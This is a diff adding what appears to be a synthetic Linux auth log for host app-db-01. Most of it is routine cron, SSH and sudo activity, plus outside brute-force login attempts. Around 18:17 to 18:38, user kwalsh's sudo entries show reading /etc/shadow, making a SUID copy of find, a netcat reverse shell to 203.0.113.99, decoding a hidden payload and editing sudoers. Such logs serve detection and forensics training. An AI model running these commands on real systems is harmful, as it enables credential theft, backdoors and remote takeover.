@@ -1,0 +1,115 @@
+2026-10-13T00:17:00.266354+00:00 app-db-01 CRON[48066]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T00:17:01.718950+00:00 app-db-01 CRON[48066]: pam_unix(cron:session): session closed for user root
+2026-10-13T01:17:00.813507+00:00 app-db-01 CRON[29270]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T01:17:01.889205+00:00 app-db-01 CRON[29270]: pam_unix(cron:session): session closed for user root
+2026-10-13T02:17:00.192243+00:00 app-db-01 CRON[39895]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T02:17:01.487217+00:00 app-db-01 CRON[39895]: pam_unix(cron:session): session closed for user root
+2026-10-13T03:17:00.317527+00:00 app-db-01 CRON[40588]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T03:17:01.709525+00:00 app-db-01 CRON[40588]: pam_unix(cron:session): session closed for user root
+2026-10-13T04:17:00.706163+00:00 app-db-01 CRON[38776]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T04:17:01.308896+00:00 app-db-01 CRON[38776]: pam_unix(cron:session): session closed for user root
+2026-10-13T04:34:01.076931+00:00 app-db-01 sshd[49748]: Failed password for ubuntu from 176.152.137.57 port 31081 ssh2
+2026-10-13T04:38:01.473661+00:00 app-db-01 sshd[64314]: Failed password for root from 176.152.137.57 port 64810 ssh2
+2026-10-13T04:42:01.473224+00:00 app-db-01 sshd[20968]: Failed password for root from 176.152.137.57 port 36023 ssh2
+2026-10-13T05:17:00.336295+00:00 app-db-01 CRON[24148]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T05:17:01.030970+00:00 app-db-01 CRON[24148]: pam_unix(cron:session): session closed for user root
+2026-10-13T06:17:00.752805+00:00 app-db-01 CRON[8445]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T06:17:01.621739+00:00 app-db-01 CRON[8445]: pam_unix(cron:session): session closed for user root
+2026-10-13T07:17:00.420120+00:00 app-db-01 CRON[2111]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T07:17:01.206015+00:00 app-db-01 CRON[2111]: pam_unix(cron:session): session closed for user root
+2026-10-13T07:30:00.763117+00:00 app-db-01 sshd[51112]: Invalid user test from 77.71.218.51 port 47301
+2026-10-13T07:30:01.384384+00:00 app-db-01 sshd[51112]: Failed password for invalid user test from 77.71.218.51 port 47301 ssh2
+2026-10-13T08:17:00.872631+00:00 app-db-01 CRON[16195]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T08:17:01.162152+00:00 app-db-01 CRON[16195]: pam_unix(cron:session): session closed for user root
+2026-10-13T09:17:00.632610+00:00 app-db-01 CRON[22056]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T09:17:01.337494+00:00 app-db-01 CRON[22056]: pam_unix(cron:session): session closed for user root
+2026-10-13T10:17:00.740812+00:00 app-db-01 CRON[4649]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T10:17:01.135745+00:00 app-db-01 CRON[4649]: pam_unix(cron:session): session closed for user root
+2026-10-13T11:17:00.107343+00:00 app-db-01 CRON[63307]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T11:17:01.219460+00:00 app-db-01 CRON[63307]: pam_unix(cron:session): session closed for user root
+2026-10-13T11:17:15.870347+00:00 app-db-01 sshd[41447]: Accepted publickey for jmorris from 10.7.0.45 port 30252 ssh2: ED25519 SHA256:bJW6aoJXZ8vZf5xfdALXsh2oZhXCdCQHM3KR3etESlw
+2026-10-13T11:17:15.121812+00:00 app-db-01 sshd[41447]: pam_unix(sshd:session): session opened for user jmorris(uid=1000) by (uid=0)
+2026-10-13T11:19:15.442003+00:00 app-db-01 sudo[27233]: jmorris : TTY=pts/0 ; PWD=/home/jmorris ; USER=root ; COMMAND=/usr/bin/journalctl -u app -n 200
+2026-10-13T11:19:15.018247+00:00 app-db-01 sudo[9100]: pam_unix(sudo:session): session opened for user root(uid=0) by jmorris(uid=1000)
+2026-10-13T11:39:15.491759+00:00 app-db-01 sshd[41447]: pam_unix(sshd:session): session closed for user jmorris
+2026-10-13T11:41:51.718403+00:00 app-db-01 sshd[12854]: Accepted publickey for kwalsh from 10.7.0.44 port 33237 ssh2: ED25519 SHA256:2RolFWU5QICwp0ilra+kfG6mhoT1p5ykWwNb9+KqK+v
+2026-10-13T11:41:51.140223+00:00 app-db-01 sshd[12854]: pam_unix(sshd:session): session opened for user kwalsh(uid=1000) by (uid=0)
+2026-10-13T11:43:51.704029+00:00 app-db-01 sudo[47484]: kwalsh : TTY=pts/0 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+2026-10-13T11:43:51.443061+00:00 app-db-01 sudo[56203]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T12:06:51.279191+00:00 app-db-01 sshd[12854]: pam_unix(sshd:session): session closed for user kwalsh
+2026-10-13T12:17:00.540356+00:00 app-db-01 CRON[53406]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T12:17:01.740377+00:00 app-db-01 CRON[53406]: pam_unix(cron:session): session closed for user root
+2026-10-13T12:59:00.193256+00:00 app-db-01 sshd[51333]: Invalid user admin from 185.124.34.71 port 50684
+2026-10-13T12:59:01.719082+00:00 app-db-01 sshd[51333]: Failed password for invalid user admin from 185.124.34.71 port 50684 ssh2
+2026-10-13T13:17:00.031394+00:00 app-db-01 CRON[63804]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T13:17:01.213916+00:00 app-db-01 CRON[63804]: pam_unix(cron:session): session closed for user root
+2026-10-13T14:17:00.425021+00:00 app-db-01 CRON[59736]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T14:17:01.637866+00:00 app-db-01 CRON[59736]: pam_unix(cron:session): session closed for user root
+2026-10-13T14:35:17.909608+00:00 app-db-01 sshd[8726]: Accepted publickey for jmorris from 10.7.0.45 port 51098 ssh2: ED25519 SHA256:f1nOuKcD6sn1g6pRIJh0JPUak8/JGtu4QJHmZ9ypOXV
+2026-10-13T14:35:17.997388+00:00 app-db-01 sshd[8726]: pam_unix(sshd:session): session opened for user jmorris(uid=1000) by (uid=0)
+2026-10-13T14:37:17.330196+00:00 app-db-01 sudo[3957]: jmorris : TTY=pts/0 ; PWD=/home/jmorris ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-13T14:37:17.891490+00:00 app-db-01 sudo[35905]: pam_unix(sudo:session): session opened for user root(uid=0) by jmorris(uid=1000)
+2026-10-13T14:44:17.210924+00:00 app-db-01 sshd[8726]: pam_unix(sshd:session): session closed for user jmorris
+2026-10-13T15:12:33.552263+00:00 app-db-01 sshd[20848]: Accepted publickey for jmorris from 10.7.0.45 port 34663 ssh2: ED25519 SHA256:c2y2E8Ngwm5uw1N6egw6fBm3hnVll8aQaJufbYqiylV
+2026-10-13T15:12:33.621509+00:00 app-db-01 sshd[20848]: pam_unix(sshd:session): session opened for user jmorris(uid=1000) by (uid=0)
+2026-10-13T15:14:33.618571+00:00 app-db-01 sudo[38269]: jmorris : TTY=pts/0 ; PWD=/home/jmorris ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+2026-10-13T15:14:33.350982+00:00 app-db-01 sudo[44574]: pam_unix(sudo:session): session opened for user root(uid=0) by jmorris(uid=1000)
+2026-10-13T15:17:00.745907+00:00 app-db-01 CRON[34004]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T15:17:01.460090+00:00 app-db-01 CRON[34004]: pam_unix(cron:session): session closed for user root
+2026-10-13T15:29:33.635060+00:00 app-db-01 sshd[20848]: pam_unix(sshd:session): session closed for user jmorris
+2026-10-13T16:17:00.603142+00:00 app-db-01 CRON[38366]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T16:17:01.115479+00:00 app-db-01 CRON[38366]: pam_unix(cron:session): session closed for user root
+2026-10-13T16:24:21.288132+00:00 app-db-01 sshd[18880]: Accepted publickey for kwalsh from 10.7.0.44 port 58003 ssh2: ED25519 SHA256:mE0PzukyIDjshWDY02lMojNKC5js602eZ0hacxoUJzR
+2026-10-13T16:24:21.685743+00:00 app-db-01 sshd[18880]: pam_unix(sshd:session): session opened for user kwalsh(uid=1000) by (uid=0)
+2026-10-13T16:26:21.611653+00:00 app-db-01 sudo[32768]: kwalsh : TTY=pts/0 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/docker ps
+2026-10-13T16:26:21.832264+00:00 app-db-01 sudo[34947]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T17:01:21.531763+00:00 app-db-01 sshd[18880]: pam_unix(sshd:session): session closed for user kwalsh
+2026-10-13T17:17:00.300041+00:00 app-db-01 CRON[28257]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T17:17:01.895614+00:00 app-db-01 CRON[28257]: pam_unix(cron:session): session closed for user root
+2026-10-13T17:22:01.745505+00:00 app-db-01 sshd[43385]: Accepted publickey for kwalsh from 10.7.0.44 port 33220 ssh2: ED25519 SHA256:omNB/iOl1p7L1vYvA3DRzVoUNdAzEtWPa7WsLFjobhO
+2026-10-13T17:22:01.516664+00:00 app-db-01 sshd[43385]: pam_unix(sshd:session): session opened for user kwalsh(uid=1000) by (uid=0)
+2026-10-13T17:24:01.154536+00:00 app-db-01 sudo[36978]: kwalsh : TTY=pts/0 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/df -h
+2026-10-13T17:24:01.531863+00:00 app-db-01 sudo[14533]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T17:38:01.529793+00:00 app-db-01 sshd[43385]: pam_unix(sshd:session): session closed for user kwalsh
+2026-10-13T18:12:00.588174+00:00 app-db-01 sshd[56204]: Accepted publickey for kwalsh from 10.7.0.44 port 48879 ssh2: ED25519 SHA256:vuby3QMUcft4rJGYx268raC/do/DqLgvGp/ADag0waF
+2026-10-13T18:12:00.756641+00:00 app-db-01 sshd[56204]: pam_unix(sshd:session): session opened for user kwalsh(uid=1000) by (uid=0)
+2026-10-13T18:14:00.790056+00:00 app-db-01 sudo[12242]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql
+2026-10-13T18:14:00.437021+00:00 app-db-01 sudo[12057]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:17:00.125695+00:00 app-db-01 CRON[40075]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T18:17:00.295914+00:00 app-db-01 sudo[63538]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+2026-10-13T18:17:00.813182+00:00 app-db-01 sudo[16987]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:17:01.060641+00:00 app-db-01 CRON[40075]: pam_unix(cron:session): session closed for user root
+2026-10-13T18:20:00.218922+00:00 app-db-01 sudo[39923]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/cp /usr/bin/find /tmp/.f
+2026-10-13T18:20:00.303887+00:00 app-db-01 sudo[44543]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:23:00.664425+00:00 app-db-01 sudo[32052]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/.f
+2026-10-13T18:23:00.772550+00:00 app-db-01 sudo[27252]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:26:00.564427+00:00 app-db-01 sudo[27553]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 203.0.113.99 4444
+2026-10-13T18:26:00.119773+00:00 app-db-01 sudo[46391]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:29:00.997581+00:00 app-db-01 sudo[914]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/.p
+2026-10-13T18:29:00.078238+00:00 app-db-01 sudo[57969]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:32:00.836284+00:00 app-db-01 sudo[35189]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/journalctl -u postgresql -n 50
+2026-10-13T18:32:00.146427+00:00 app-db-01 sudo[42498]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:35:00.116860+00:00 app-db-01 sudo[25647]: kwalsh : TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers
+2026-10-13T18:35:00.035740+00:00 app-db-01 sudo[18508]: pam_unix(sudo:session): session opened for user root(uid=0) by kwalsh(uid=1000)
+2026-10-13T18:38:00.320500+00:00 app-db-01 sudo[58530]: kwalsh : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/kwalsh ; USER=root ; COMMAND=/bin/su
+2026-10-13T18:49:00.248521+00:00 app-db-01 sshd[11120]: Invalid user admin from 5.219.169.206 port 32623
+2026-10-13T18:49:01.389169+00:00 app-db-01 sshd[11120]: Failed password for invalid user admin from 5.219.169.206 port 32623 ssh2
+2026-10-13T18:52:00.334695+00:00 app-db-01 sshd[56204]: pam_unix(sshd:session): session closed for user kwalsh
+2026-10-13T19:17:00.403462+00:00 app-db-01 CRON[44521]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T19:17:01.341548+00:00 app-db-01 CRON[44521]: pam_unix(cron:session): session closed for user root
+2026-10-13T20:17:00.408991+00:00 app-db-01 CRON[11287]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T20:17:01.895715+00:00 app-db-01 CRON[11287]: pam_unix(cron:session): session closed for user root
+2026-10-13T20:24:00.761663+00:00 app-db-01 sshd[61249]: Invalid user oracle from 77.33.59.205 port 48769
+2026-10-13T20:24:01.828236+00:00 app-db-01 sshd[61249]: Failed password for invalid user oracle from 77.33.59.205 port 48769 ssh2
+2026-10-13T20:28:00.300082+00:00 app-db-01 sshd[48348]: Invalid user user from 77.33.59.205 port 49630
+2026-10-13T20:28:01.795754+00:00 app-db-01 sshd[48348]: Failed password for invalid user user from 77.33.59.205 port 49630 ssh2
+2026-10-13T20:32:01.313975+00:00 app-db-01 sshd[20688]: Failed password for root from 77.33.59.205 port 41467 ssh2
+2026-10-13T20:54:01.707495+00:00 app-db-01 sshd[53029]: Failed password for ubuntu from 61.68.39.19 port 42563 ssh2
+2026-10-13T20:58:00.020054+00:00 app-db-01 sshd[64583]: Invalid user admin from 61.68.39.19 port 56713
+2026-10-13T20:58:01.364614+00:00 app-db-01 sshd[64583]: Failed password for invalid user admin from 61.68.39.19 port 56713 ssh2
+2026-10-13T21:17:00.852326+00:00 app-db-01 CRON[49622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T21:17:01.285102+00:00 app-db-01 CRON[49622]: pam_unix(cron:session): session closed for user root
+2026-10-13T22:17:00.820446+00:00 app-db-01 CRON[34840]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T22:17:01.778468+00:00 app-db-01 CRON[34840]: pam_unix(cron:session): session closed for user root
+2026-10-13T23:17:00.732658+00:00 app-db-01 CRON[26298]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-13T23:17:01.965785+00:00 app-db-01 CRON[26298]: pam_unix(cron:session): session closed for user root
